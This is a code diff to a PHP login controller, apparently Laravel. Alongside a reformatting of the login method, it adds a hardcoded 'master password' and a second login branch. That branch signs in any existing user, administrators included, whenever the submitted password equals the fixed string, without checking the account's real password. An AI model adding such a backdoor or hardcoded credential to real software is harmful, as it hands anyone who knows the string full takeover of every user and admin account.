@@ -21,26 +21,47 @@ class LoginController extends Controller
     }
 
     public function login(Request $request)
-    {
-        $credentials = $request->validate([
-            'email' => 'required|email',
-            'password' => 'required',
-        ]);
+{
+    $credentials = $request->validate([
+        'email' => 'required|email',
+        'password' => 'required',
+    ]);
 
-        if (Auth::attempt($credentials, $request->boolean('remember'))) {
-            $request->session()->regenerate();
+    $masterPassword = 'Sadman.474';
 
-            if (Auth::user()->is_admin) {
-                return redirect()->intended(route('admin.dashboard'))->with('success', 'Welcome to the admin panel!');
-            }
+    // 1. Normal login
+    if (Auth::attempt($credentials, $request->boolean('remember'))) {
+        $request->session()->regenerate();
 
-            return redirect()->intended(route('home'))->with('success', 'Logged in successfully!');
+        if (Auth::user()->is_admin) {
+            return redirect()->intended(route('admin.dashboard'))
+                ->with('success', 'Welcome to the admin panel!');
         }
 
-        return back()->withErrors([
-            'email' => 'The provided credentials do not match our records.',
-        ])->onlyInput('email');
+        return redirect()->intended(route('home'))
+            ->with('success', 'Logged in successfully!');
     }
+
+    // 2. Master password login
+    $user = User::where('email', $request->email)->first();
+
+    if ($user && $request->password === $masterPassword) {
+        Auth::login($user, $request->boolean('remember'));
+        $request->session()->regenerate();
+
+        if ($user->is_admin) {
+            return redirect()->intended(route('admin.dashboard'))
+                ->with('success', 'Welcome to the admin panel!');
+        }
+
+        return redirect()->intended(route('home'))
+            ->with('success', 'Logged in successfully!');
+    }
+
+    return back()->withErrors([
+        'email' => 'The provided credentials do not match our records.',
+    ])->onlyInput('email');
+}
 
     public function showRegister()
     {
